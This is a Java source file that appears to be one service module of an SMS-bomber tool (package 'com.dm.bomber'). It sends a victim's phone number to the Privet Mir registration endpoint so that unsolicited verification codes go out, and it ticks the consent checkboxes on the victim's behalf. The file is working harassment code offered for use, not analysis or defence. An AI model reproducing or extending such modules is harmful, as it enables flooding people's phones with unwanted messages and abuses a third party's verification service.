package com.dm.bomber.services;

import okhttp3.FormBody;

public class PrivetMir extends FormService {

    public PrivetMir() {
        setUrl("https://api-user.privetmir.ru/api/send-code");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public void buildBody(FormBody.Builder builder) {
        builder.add("back_url", "/register/step-2/");
        builder.add("scope", "register-user");
        builder.add("login", getFormattedPhone());
        builder.add("checkExist", "Y");
        builder.add("checkApproves", "Y");
        builder.add("approve1", "on");
        builder.add("approve2", "on");
    }
}
